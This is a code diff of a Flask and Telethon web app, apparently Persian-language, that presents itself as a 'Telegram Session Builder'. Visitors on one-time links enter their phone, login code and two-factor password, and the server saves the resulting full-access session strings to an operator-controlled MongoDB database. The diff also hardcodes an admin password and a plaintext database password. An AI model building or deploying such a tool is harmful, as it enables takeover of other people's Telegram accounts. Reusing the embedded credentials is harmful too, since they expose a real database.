@@ -1,10 +1,10 @@
 # ================================================================
-# Telegram Session Builder – Render Ready
-# Admin Panel + MongoDB + Auto Expire Links + Keep Alive
+# Telegram Session Builder – Stable Render Version
+# Admin Panel + MongoDB + One-Time Links + Keep Alive
 # By: Tiam
 # ================================================================
 
-import os, threading, asyncio, secrets
+import asyncio, threading, secrets
 from flask import Flask, request, jsonify, render_template_string, redirect
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -21,9 +21,16 @@ self_config = {
     "admin_password": "tiam_khorshid",
 }
 
-# ===================== Mongo ====================================
+# ===================== MongoDB ==================================
 
-mongo_uri = "mongodb://strawhatmusicdb_db_user:<db_password>@ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
+mongo_uri = (
+    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
+    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
+    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
+    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
+    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
+)
+
 mongo = MongoClient(mongo_uri)
 db = mongo["telegram_sessions"]
 sessions_col = db["sessions"]
@@ -58,37 +65,17 @@ HTML_PAGE = """
 <head>
 <title>Session Builder</title>
 <style>
-body {
-    background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
-    background-size: cover;
-    font-family: tahoma;
-    color: white;
-}
-.box {
-    width: 360px;
-    margin: 120px auto;
-    padding: 25px;
-    background: rgba(0,0,0,0.6);
-    border-radius: 15px;
-    text-align: center;
-}
-input,button {
-    width: 95%;
-    padding: 12px;
-    margin-top: 10px;
-    border-radius: 10px;
-    border: none;
-    font-size: 16px;
-}
-button {
-    background: #5865f2;
-    color: white;
-    cursor: pointer;
-}
+body{
+background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center fixed;
+background-size:cover;font-family:tahoma;color:white}
+.box{width:360px;margin:120px auto;padding:25px;background:rgba(0,0,0,.65);
+border-radius:16px;text-align:center}
+input,button{width:95%;padding:12px;margin-top:10px;
+border-radius:10px;border:none;font-size:16px}
+button{background:#5865f2;color:white;cursor:pointer}
 </style>
 </head>
 <body>
-
 <div class="box">
 <h3>ساخت سشن تلگرام</h3>
 
@@ -110,23 +97,24 @@ button {
 <div id="done" style="display:none">
 <h3>✅ سشن ساخته شد</h3>
 </div>
-
 </div>
 
 <script>
 let phone="";
 
 function sendPhone(){
- phone=document.getElementById("phone").value;
- fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+ phone = document.getElementById("phone").value;
+ fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},
+ body:JSON.stringify({phone})})
  .then(r=>r.json()).then(d=>{
-   if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
    alert(d.message);
+   if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
  });
 }
 
 function sendCode(){
- fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})
+ fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},
+ body:JSON.stringify({phone,code:code.value})})
  .then(r=>r.json()).then(d=>{
    if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
    if(d.status=="ok"){finish();}
@@ -134,8 +122,9 @@ function sendCode(){
 }
 
 function sendPassword(){
- fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})
- .then(r=>r.json()).then(d=>{ if(d.status=="ok"){finish();}});
+ fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},
+ body:JSON.stringify({phone,password:password.value})})
+ .then(r=>r.json()).then(d=>{if(d.status=="ok"){finish();}});
 }
 
 function finish(){
@@ -145,23 +134,23 @@ function finish(){
 
 setInterval(()=>fetch("/ping"),240000);
 </script>
-
 </body>
 </html>
 """
 
 # ===================== Utils ====================================
 
-def token():
-    return secrets.token_urlsafe(10)
+def gen_token():
+    return secrets.token_urlsafe(8)
 
-def valid_link(t):
-    link = links_col.find_one({"token":t})
+def consume_link(token):
+    link = links_col.find_one({"token": token})
     if not link:
         return False
-    if link["used"] >= link["max"]:
-        links_col.delete_one({"token":t})
-        return False
+    if link["used"] + 1 >= link["max"]:
+        links_col.delete_one({"token": token})
+    else:
+        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
     return True
 
 # ===================== Routes ===================================
@@ -169,9 +158,8 @@ def valid_link(t):
 @app.route("/")
 def home():
     t = request.args.get("key")
-    if not t or not valid_link(t):
+    if not t or not consume_link(t):
         return "❌ لینک نامعتبر یا منقضی شده"
-    links_col.update_one({"token":t},{"$inc":{"used":1}})
     return render_template_string(HTML_PAGE)
 
 @app.route("/ping")
@@ -183,12 +171,12 @@ def ping():
 @app.route("/admin", methods=["GET","POST"])
 def admin():
     auth = request.authorization
-    if not auth or auth.username!=self_config["admin_username"] or auth.password!=self_config["admin_password"]:
-        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
+    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
+        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic realm='Admin'"})
 
-    if request.method=="POST":
+    if request.method == "POST":
         links_col.insert_one({
-            "token": token(),
+            "token": gen_token(),
             "max": int(request.form["max"]),
             "used": 0,
             "created": datetime.utcnow()
@@ -201,9 +189,7 @@ def admin():
         <tr>
         <td>?key={l['token']}</td>
         <td>{l['used']} / {l['max']}</td>
-        <td>
-        <a href="/delete/{l['token']}">❌ حذف</a>
-        </td>
+        <td><a href="/admin/delete/{l['token']}">❌ حذف</a></td>
         </tr>
         """
 
@@ -211,46 +197,49 @@ def admin():
     <html><body style="background:#111;color:white;font-family:tahoma">
     <h2>پنل ادمین</h2>
     <form method="post">
-    <input name="max" type="number" placeholder="تعداد استفاده">
+    <input name="max" type="number" placeholder="تعداد استفاده" required>
     <button>ساخت لینک</button>
     </form>
-    <table border=1 cellpadding=8>{rows}</table>
+    <table border=1 cellpadding=10>{rows}</table>
     </body></html>
     """
 
-@app.route("/delete/<token>")
+@app.route("/admin/delete/<token>")
 def delete(token):
-    links_col.delete_one({"token":token})
+    auth = request.authorization
+    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
+        return ("Unauthorized", 401)
+    links_col.delete_one({"token": token})
     return redirect("/admin")
 
 # ===================== Telethon ================================
 
 clients = {}
 
-async def new_client(phone):
-    c = TelegramClient(StringSession(),self_config["api_id"],self_config["api_hash"])
+async def new_client():
+    c = TelegramClient(StringSession(), self_config["api_id"], self_config["api_hash"])
     await c.connect()
     return c
 
-@app.route("/send_phone",methods=["POST"])
+@app.route("/send_phone", methods=["POST"])
 def send_phone():
-    phone=request.json["phone"]
+    phone = request.json["phone"]
     async def job():
-        c=await new_client(phone)
-        clients[phone]=c
+        c = await new_client()
+        clients[phone] = c
         await c.send_code_request(phone)
     run_async(job())
-    return jsonify(status="ok",message="کد ارسال شد")
+    return jsonify(status="ok", message="کد ارسال شد")
 
-@app.route("/send_code",methods=["POST"])
+@app.route("/send_code", methods=["POST"])
 def send_code():
-    phone=request.json["phone"]
-    code=request.json["code"]
-    c=clients.get(phone)
+    phone = request.json["phone"]
+    code = request.json["code"]
+    c = clients.get(phone)
     try:
         async def job():
-            await c.sign_in(phone,code)
-            sessions_col.insert_one({"phone":phone,"session":c.session.save()})
+            await c.sign_in(phone, code)
+            sessions_col.insert_one({"phone": phone, "session": c.session.save()})
         run_async(job())
         return jsonify(status="ok")
     except SessionPasswordNeededError:
@@ -258,18 +247,18 @@ def send_code():
     except PhoneCodeInvalidError:
         return jsonify(status="error")
 
-@app.route("/send_password",methods=["POST"])
+@app.route("/send_password", methods=["POST"])
 def send_password():
-    phone=request.json["phone"]
-    pwd=request.json["password"]
-    c=clients.get(phone)
+    phone = request.json["phone"]
+    pwd = request.json["password"]
+    c = clients.get(phone)
     async def job():
         await c.sign_in(password=pwd)
-        sessions_col.insert_one({"phone":phone,"session":c.session.save()})
+        sessions_col.insert_one({"phone": phone, "session": c.session.save()})
     run_async(job())
     return jsonify(status="ok")
 
 # ===================== Run ======================================
 
-if __name__=="__main__":
-    app.run(host="0.0.0.0",port=8000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8000)
